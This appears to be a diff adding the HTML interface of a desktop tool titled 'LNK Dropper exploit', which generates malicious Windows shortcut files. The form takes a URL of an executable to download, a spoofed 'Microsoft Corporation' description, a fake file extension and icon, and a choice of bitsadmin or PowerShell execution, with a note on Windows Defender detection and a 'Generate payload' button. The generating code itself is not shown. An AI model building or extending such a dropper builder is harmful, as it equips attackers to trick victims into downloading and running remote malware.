@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>LNK Dropper exploit</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" type="image/png" href="images/exploit-logo.ico"/>
+        <!-- Libs -->
+        <script type="text/javascript" src="/eel.js"></script>
+        <link rel="stylesheet" href="lib/css/uikit.min.css"/>
+        <link rel="stylesheet" href="lib/css/builder.css"/>
+        <script src="lib/js/uikit.min.js"></script>
+        <script src="lib/js/WS_script.js"></script>
+        <script src="lib/js/iconify-icon.min.js"></script>
+    </head>
+    <body>
+        
+        <!-- Style -->
+        <style>
+            .nav-el {
+                margin-top: 18px;
+                cursor: pointer;
+            }
+            .nav-el > p > iconify-icon {
+                position: relative;
+                top: 7px !important;
+                font-size: 24px;
+            }
+        </style>
+
+        <!-- Script -->
+        <script>
+
+            async function generate() {
+                let url = document.getElementById('executable_url').value;
+                let description = document.getElementById('file_description').value;
+                let extension = document.getElementById('file_icon').value;
+                let technique = document.getElementById('technique').value;
+                let save_path = (await eel.generate_exploit_shortcut(url, extension, description, technique)());
+                notification('Saved as:<br>' + save_path, 'fa6-solid:square-virus', 5000);
+            }
+
+            async function load() {
+                let extensions =  (await eel.get_available_payloads()());
+                let selectElement = document.getElementById('file_icon');
+
+                extensions.forEach(element => {
+                    let option = document.createElement("option");
+                    option.value = element;
+                    option.text = '.' + element;
+                    selectElement.appendChild(option);
+                });
+            }
+
+            window.addEventListener('load', (e) => {
+                load();
+            });
+
+        </script>
+
+        <!-- Navigation -->
+        <nav class="uk-navbar-container" uk-navbar="align: center">
+            <div class="uk-navbar">
+                <ul class="uk-navbar-nav">
+                    <li>
+                        <img width="64" height="64" src="images/logo.png" alt="Logo">
+                        <p id="project_name" class="uk-label" style="font-size: 20px; font-family: monospace;"></p>
+                    </li>
+                    <li class="nav-el">
+                        <p onclick='window.open(supportUrl);'>
+                            <iconify-icon icon="ic:baseline-telegram"></iconify-icon> 
+                            Support
+                            <iconify-icon style="color: rgb(21, 174, 21);" icon="svg-spinners:pulse-2"></iconify-icon>
+                        </p>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+
+        <div class="uk-card uk-card-default uk-card-body">
+            <!-- URL -->
+            <label for="executable_url">
+                Direct url for executable
+                <input id="executable_url" class="uk-input" type="text" placeholder="Url" aria-label="" value="https://ryara.net/putty-url/download/0.78/x86_64/putty.exe">
+            </label>
+            <!-- Description -->
+            <label for="file_description">
+                Description
+                <input id="file_description" class="uk-input" type="text" placeholder="Description" value="Microsoft Corporation" aria-label="">
+            </label>
+            <!-- Techniques -->
+            <label for="technique">
+                Execution technique
+                <div style="display: inline-flex; width: 100%;">
+                    <select id="technique" class="uk-select">
+                        <option value="bitsadmin">Bitsadmin (Detected by WD)</option>
+                        <option value="powershell" selected>Powershell</option>
+                    </select>
+                </div>
+            </label>
+
+            <!-- Target extension -->
+            <label for="file_icon">
+                Fake extension (Some extensions may require the target software to be installed in order to display the icon)
+                <div style="display: inline-flex; width: 100%;">
+                    <select id="file_icon" class="uk-select"></select>
+                </div>
+            </label>
+
+            <!-- Submit -->
+            <button class="uk-button uk-button-primary" type="button" onclick="generate();">
+                <iconify-icon icon="mdi:virus"></iconify-icon> Generate payload
+            </button>
+
+        </div>
+
+    </body>
+</html>
